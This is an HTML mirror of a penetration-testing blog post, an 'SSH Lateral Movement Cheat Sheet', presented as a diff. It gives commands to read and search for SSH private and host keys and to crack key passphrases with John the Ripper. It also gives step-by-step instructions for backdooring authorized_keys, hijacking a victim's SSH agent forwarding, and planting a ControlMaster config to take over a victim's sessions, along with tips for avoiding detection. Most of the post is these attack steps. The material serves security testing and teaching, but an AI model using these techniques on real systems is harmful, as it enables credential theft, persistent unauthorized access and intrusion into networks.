@@ -1,0 +1,627 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+
+<!-- Mirrored from highon.coffee/blog/ssh-lateral-movement-cheat-sheet/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Dec 2022 15:33:12 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<script src="../../cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
+<title>SSH Lateral Movement Cheat Sheet</title>
+<meta name="description" content="SSH lateral movement cheat sheet, a collection of lateral movement techniques to move deeper through the network.">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="../../feed.xml">
+
+<link rel="stylesheet" type="text/css" href="../../css/screen.css">
+
+<link rel="icon" type="image/x-icon" href="../../favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="../../index.html">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="../../about/index.html"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="../../services/index.html"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="../../index.html">
+<span>HighOn.Coffee</span>
+<img src="../../img/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="../../index.html">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="../../about/index.html"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="../../services/index.html"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</option>
+<option value="/blog/insecure-direct-object-reference-idor/">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet: Commands & Examples (2022)</option>
+<option value="/blog/encrypted-note-taking-solution/">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</option>
+<option value="/blog/dns-tunnel-dnscat2-cheat-sheet/">DNS Tunneling dnscat2 Cheat Sheet</option>
+<option value="/blog/ssh-lateral-movement-cheat-sheet/">SSH Lateral Movement Cheat Sheet</option>
+<option value="/blog/android-app-pen-testing-environment/">Android Pen Testing Environment Setup</option>
+<option value="/blog/password-reset-security-testing-cheat-sheet/">Password Reset Testing Cheat Sheet</option>
+<option value="/blog/ssrf-cheat-sheet/">SSRF Cheat Sheet & Bypass Techniques</option>
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Pen Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vim Cheat Sheet [2022 Update] + NEOVIM</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+SSH Lateral Movement Cheat Sheet
+<a href="index.html" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+cheat-sheet
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+03 Jun 2021
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<ul id="markdown-toc">
+<li><a href="#what-is-a-lateral-movement" id="markdown-toc-what-is-a-lateral-movement">What is a Lateral Movement</a></li>
+<li><a href="#ssh-lateral-movement" id="markdown-toc-ssh-lateral-movement">SSH Lateral Movement</a> <ul>
+<li><a href="#manually-look-for-ssh-keys" id="markdown-toc-manually-look-for-ssh-keys">Manually Look for SSH Keys</a></li>
+<li><a href="#search-for-files-containing-ssh-keys" id="markdown-toc-search-for-files-containing-ssh-keys">Search For Files Containing SSH Keys</a></li>
+<li><a href="#identify-the-host-for-the-key" id="markdown-toc-identify-the-host-for-the-key">Identify The Host for the Key</a></li>
+<li><a href="#cracking-ssh-passphrase-keys" id="markdown-toc-cracking-ssh-passphrase-keys">Cracking SSH Passphrase Keys</a> <ul>
+<li><a href="#cracking-ssh-passphrase-with-john-the-ripper" id="markdown-toc-cracking-ssh-passphrase-with-john-the-ripper">Cracking SSH Passphrase with John the Ripper</a></li>
+</ul>
+</li>
+<li><a href="#ssh-passphrase-backdoor" id="markdown-toc-ssh-passphrase-backdoor">SSH Passphrase Backdoor</a></li>
+</ul>
+</li>
+<li><a href="#ssh-agent-forwarding-hijacking" id="markdown-toc-ssh-agent-forwarding-hijacking">SSH Agent Forwarding Hijacking</a> <ul>
+<li><a href="#how-ssh-agent-works" id="markdown-toc-how-ssh-agent-works">How SSH Agent Works</a> <ul>
+<li><a href="#the-risk" id="markdown-toc-the-risk">The Risk</a></li>
+</ul>
+</li>
+<li><a href="#how-to-hijack-ssh-agent-forwarding" id="markdown-toc-how-to-hijack-ssh-agent-forwarding">How To Hijack SSH Agent Forwarding</a> <ul>
+<li><a href="#client-instructions" id="markdown-toc-client-instructions">Client Instructions</a></li>
+</ul>
+</li>
+<li><a href="#ssh-hijacking-with-controlmaster" id="markdown-toc-ssh-hijacking-with-controlmaster">SSH Hijacking with ControlMaster</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="what-is-a-lateral-movement">What is a Lateral Movement</h2>
+<p>A lateral movement typically occurs after a host has been compromised via a reverse shell, and foothold in the network is obtained. Fully compromising the target machine by performing Linux privilege escalation or Windows privilege escalation could be advantageous due to the increased access to files or operating system functionality leveraged by a root level account.</p>
+<p>This article focuses specifically on SSH lateral movement techniques on Linux.</p>
+
+<h2 id="ssh-lateral-movement">SSH Lateral Movement</h2>
+<p>SSH private keys are typically an easy way to progress through the network, and are often found with poor permissions or duplicated in home directories. This article does not cover SSH pivoting in depth, we have a separate resource for <a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH pivoting</a>.</p>
+<div class="note info">
+<h5>Enumerate Non UNIX Based Hosts for Private Keys</h5>
+<p>SSH is not specific to UNIX based operating systems, consider enumerating Windows target for SSH private keys.</p>
+</div>
+<h3 id="manually-look-for-ssh-keys">Manually Look for SSH Keys</h3>
+<p>Check home directories and obvious locations for private key files:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/home/<span class="k">*</span>
+<span class="nb">cat</span> /root/.ssh/authorized<span class="se">\_</span>keys 
+<span class="nb">cat</span> /root/.ssh/identity.pub 
+<span class="nb">cat</span> /root/.ssh/identity 
+<span class="nb">cat</span> /root/.ssh/id<span class="se">\_</span>rsa.pub 
+<span class="nb">cat</span> /root/.ssh/id<span class="se">\_</span>rsa 
+<span class="nb">cat</span> /root/.ssh/id<span class="se">\_</span>dsa.pub 
+<span class="nb">cat</span> /root/.ssh/id<span class="se">\_</span>dsa 
+<span class="nb">cat</span> /etc/ssh/ssh<span class="se">\_</span>config 
+<span class="nb">cat</span> /etc/ssh/sshd<span class="se">\_</span>config 
+<span class="nb">cat</span> /etc/ssh/ssh<span class="se">\_</span>host<span class="se">\_</span>dsa<span class="se">\_</span>key.pub 
+<span class="nb">cat</span> /etc/ssh/ssh<span class="se">\_</span>host<span class="se">\_</span>dsa<span class="se">\_</span>key 
+<span class="nb">cat</span> /etc/ssh/ssh<span class="se">\_</span>host<span class="se">\_</span>rsa<span class="se">\_</span>key.pub 
+<span class="nb">cat</span> /etc/ssh/ssh<span class="se">\_</span>host<span class="se">\_</span>rsa<span class="se">\_</span>key 
+<span class="nb">cat</span> /etc/ssh/ssh<span class="se">\_</span>host<span class="se">\_</span>key.pub 
+<span class="nb">cat</span> /etc/ssh/ssh<span class="se">\_</span>host<span class="se">\_</span>key
+<span class="nb">cat</span> ~/.ssh/authorized<span class="se">\_</span>keys 
+<span class="nb">cat</span> ~/.ssh/identity.pub 
+<span class="nb">cat</span> ~/.ssh/identity 
+<span class="nb">cat</span> ~/.ssh/id<span class="se">\_</span>rsa.pub 
+<span class="nb">cat</span> ~/.ssh/id<span class="se">\_</span>rsa 
+<span class="nb">cat</span> ~/.ssh/id<span class="se">\_</span>dsa.pub 
+<span class="nb">cat</span> ~/.ssh/id<span class="se">\_</span>dsa </code></pre></figure>
+<h3 id="search-for-files-containing-ssh-keys">Search For Files Containing SSH Keys</h3>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"> 
+<span class="nb">grep</span> <span class="nt">-ir</span> <span class="s2">"-----BEGIN RSA PRIVATE KEY-----"</span> /home/<span class="k">*</span>
+<span class="nb">grep</span> <span class="nt">-ir</span> <span class="s2">"BEGIN DSA PRIVATE KEY"</span> /home/<span class="k">*</span>
+
+<span class="nb">grep</span> <span class="nt">-ir</span> <span class="s2">"BEGIN RSA PRIVATE KEY"</span> /<span class="k">*</span>
+<span class="nb">grep</span> <span class="nt">-ir</span> <span class="s2">"BEGIN DSA PRIVATE KEY"</span> /<span class="k">*</span></code></pre></figure>
+<h3 id="identify-the-host-for-the-key">Identify The Host for the Key</h3>
+<div class="note tip">
+<h5>Hashed known_hosts</h5>
+<p>Modern Linux systems may hash the known_hosts file entries to help prevent against enumeration.</p>
+</div>
+<p>If you find a key you then need to identify what server the key is for. In an attempt to idenitfy what host the key is for the following locations should be checked:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/etc/hosts 
+~/.known_hosts
+~/.bash_history 
+~/.ssh/config </code></pre></figure>
+<h3 id="cracking-ssh-passphrase-keys">Cracking SSH Passphrase Keys</h3>
+<p>If the discovered SSH key is encrypted with a passphrase this can be cracked locally (much faster), below are several methods. If you have access to a GPU hashcat should be leveraged to improve the cracking time.</p>
+<h4 id="cracking-ssh-passphrase-with-john-the-ripper">Cracking SSH Passphrase with John the Ripper</h4>
+<p>John the Ripper has a function to convert he key to a hash called john2hash.py and comes pre installed on Kali.</p>
+<ol>
+<li>Convert the hash: python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash-john</li>
+<li>Use a comprehensive wordlist: john –wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash-john</li>
+<li>Wait and hope</li>
+</ol>
+<div class="note warning">
+<h5>Help Avoid Detection</h5>
+<p>Avoid directly connecting from a unknown host to the target SSH server, use an already known host to help prevent detection alerts being issued. </p>
+</div>
+<h3 id="ssh-passphrase-backdoor">SSH Passphrase Backdoor</h3>
+<p>While you have access to the compromised host, it is typically a good idea to backdoor the SSH authorized_keys file which will allow for passwordless login at a point in the future. This should provide an easier and more reliable connection than exploiting and accessing via a reverse shell; and potentially reduce the risk of detection.</p>
+<p>Adding the key is simply a case of paste a SSH public key, generated on your attacking machine and pasting it into the ~/ssh/authorized_keys file on the compromised machine.</p>
+<ol>
+<li>run ssh-keygen -t rsa -b 4096</li>
+<li>cat id_rsa.pub and copy the file contents</li>
+<li>echo “SSH key data” » ~/.ssh/authorized_keys</li>
+<li>Test you can connect using the private key without being prompted for a password</li>
+</ol>
+<h2 id="ssh-agent-forwarding-hijacking">SSH Agent Forwarding Hijacking</h2>
+<p>Starting point: You have SSH already backdoored the compromised host by adding your public key to the ~/.authorized_keys file.</p>
+<h3 id="how-ssh-agent-works">How SSH Agent Works</h3>
+<p>SSH agent works by allowing the Intermediary machine to pass-through (forward) your SSH key from your client to the next downstream server, allowing the machine in the middle (potentially a bastion host) to use your key without having physical access to your key as they are not stored on the intermediate host but simply forwarded on to the downstream target server.</p>
+<ul>
+<li>Access the machine where the existing victim user session is established</li>
+<li>Root level access to the machine where the victim session is established</li>
+<li>A current victim SSH connection with agent forwarding enabled</li>
+</ul>
+<p>Your Machine =&gt; Intermediary Host (forwards your key) =&gt; Downstream Machine</p>
+<h4 id="the-risk">The Risk</h4>
+<p>The primary risk of using SSH Agent Forwarding is if the intermediatory machine is compromised, and the attacker has significant permissions they could, potentially use the established session socket to gain access to downstream servers.</p>
+<h3 id="how-to-hijack-ssh-agent-forwarding">How To Hijack SSH Agent Forwarding</h3>
+<p>Attacking Machine =&gt; Compromised Intermediary Host (with SSH Key) =&gt; Downsteam Machine (final destination)</p>
+<p>SSH agent forwarding allows a user to connect to other machines without entering passwords. This functionality can be exploited to access any host the compromised users SSH key has access to (without having direct access to the keys), while there is an active session.</p>
+<p>A potentially easier way to think of SSH agent forwarding, is to think of it as assigning the SSH key to the active SSH session, while the session is in place it is possible to access the SSH key and connect to other machines that the SSH key has access.</p>
+<p>In order to exploit SSH agent forwarding an active session must be open between the user client (that you wish to hijack) and the compromised intermediary host. You will also require access to the host where the user is connected with superuser privileges (such as <code class="language-plaintext highlighter-rouge">su - username</code>, or <code class="language-plaintext highlighter-rouge">sudo</code>) to access the account running the active SSH session you wish to hijack.</p>
+<div class="note tip">
+<h5>If -A SSH Connection Fails</h5>
+<p>If -A fails to connect, perform the following: ```echo "ForwardingAgent yes" &gt;&gt; ~/.ssh/config``` to enable agent forwarding. </p>
+</div>
+<h4 id="client-instructions">Client Instructions</h4>
+<p>Run the following on your local client machine:</p>
+<p>You may need to create a new key, if so run <code class="language-plaintext highlighter-rouge">ssh-add</code>.</p>
+<ol>
+<li>Open an SSH connection using agent forwarding to the compromised host <code class="language-plaintext highlighter-rouge">ssh -A <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="91e4e2f4e3d1f2fefce1e3fefce2f8f4f5bcf9fee2e5">[email&#160;protected]</a></code></li>
+<li>Verify agent forwarding is working by using: <code class="language-plaintext highlighter-rouge">ssh-add -l</code></li>
+<li>Obtain root: <code class="language-plaintext highlighter-rouge">sudo -s</code></li>
+<li>Gain access to the account you wish to access: <code class="language-plaintext highlighter-rouge">su - victim</code></li>
+<li>Access any SSH connection the private key of the victim has access</li>
+</ol>
+<h3 id="ssh-hijacking-with-controlmaster">SSH Hijacking with ControlMaster</h3>
+<p>OpenSSH has a function called <strong>ControlMaster</strong> that enables the sharing of multiple sessions over a single network connection. Allowing you to connect to the server once and have all other subsequent SSH sessions use the initial connection.</p>
+<p>In order to exploit SSH ControlMaster you first need shell level access to the target; you will then need sufficient privileges to modify the config of a user to enable the ControlMaster functionality.</p>
+<ol>
+<li>Gain shell level access to the target machine</li>
+<li>Access the victim users home directory and create / modify the file <code class="language-plaintext highlighter-rouge">~/.ssh/config</code></li>
+<li>Add the following configuration:</li>
+</ol>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Host <span class="k">*</span>
+
+ControlMaster auto
+~/.ssh/master-socket/%<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="e290a2">[email&#160;protected]</a>%h:%p
+ControlPersist <span class="nb">yes</span></code></pre></figure>
+<ol>
+<li>ensure the master-socket directory exists if it does not, create it <code class="language-plaintext highlighter-rouge">mkdir ~/.ssh/master-socket/</code></li>
+<li>Ensure the correct permissions are in place for the config file <code class="language-plaintext highlighter-rouge">chmod 600 ~/.ssh/config</code></li>
+<li>Wait for the victim to login and establish a connection to another server</li>
+<li>View the directory created at step 4 to observe the socket file: <code class="language-plaintext highlighter-rouge">ls -lat ~/.ssh/master-socket</code></li>
+<li>To hijack the existing connection ssh to <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="8bfef8eef9cbe3e4f8ffe5eae6ee">[email&#160;protected]</a> / IP listed in step 7</li>
+</ol>
+<p>If you know of more techniques let me know on twitter @Arr0way</p>
+<p>Enjoy.</p>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=SSH%20Lateral%20Movement%20Cheat%20Sheet&amp;url=https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/&amp;title=SSH%20Lateral%20Movement%20Cheat%20Sheet" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
+<p><a href="https://infosec.exchange/@Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Mastodon"><i class="fa fa-twitter-square" aria-hidden="true"></i> Mastodon</a>
+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+ <pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>Web App Security</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insecure-direct-object-reference-idor/index.html">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet: Commands & Examples (2022)</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>SecOps</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../encrypted-note-taking-solution/index.html">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../dns-tunnel-dnscat2-cheat-sheet/index.html">DNS Tunneling dnscat2 Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../android-app-pen-testing-environment/index.html">Android Pen Testing Environment Setup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../password-reset-security-testing-cheat-sheet/index.html">Password Reset Testing Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../ssrf-cheat-sheet/index.html">SSRF Cheat Sheet & Bypass Techniques</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Pen Testing Tools Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="../../services/pen-testing/index.html">Pen Testing Services</a>
+</li>
+<li class="">
+<a href="../cheat-sheet/index.html">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="../techniques/index.html">Techniques</a>
+</li>
+<li class="">
+<a href="../security-hardening/index.html">Security Hardening</a>
+</li>
+<li class="">
+<a href="../walkthroughs/index.html">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="">
+<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a>
+</li>
+<li class="">
+<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet: Commands & Examples (2022)</a>
+</li>
+<li class="">
+<a href="../dns-tunnel-dnscat2-cheat-sheet/index.html">DNS Tunneling dnscat2 Cheat Sheet</a>
+</li>
+<li class="current">
+<a href="index.html">SSH Lateral Movement Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../android-app-pen-testing-environment/index.html">Android Pen Testing Environment Setup</a>
+</li>
+<li class="">
+<a href="../password-reset-security-testing-cheat-sheet/index.html">Password Reset Testing Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../ssrf-cheat-sheet/index.html">SSRF Cheat Sheet & Bypass Techniques</a>
+</li>
+<li class="">
+<a href="../penetration-testing-tools-cheat-sheet/index.html">Pen Testing Tools Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../vi-cheat-sheet/index.html">Vim Cheat Sheet [2022 Update] + NEOVIM</a>
+</li>
+<li class="">
+<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="../cheat-sheet/index.html">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="../walkthroughs/index.html">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="../techniques/index.html">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="../security-hardening/index.html">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="../urandom/index.html">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="../insecure-direct-object-reference-idor/index.html">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a>
+</li>
+
+<li class="">
+<a href="../encrypted-note-taking-solution/index.html">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</a>
+</li>
+<li class="">
+<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
+</li>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
+</li>
+<li class="">
+<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
+</li>
+
+<li class="">
+<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are &copy;&nbsp;2022 <a href="../../index.html">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="../../img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
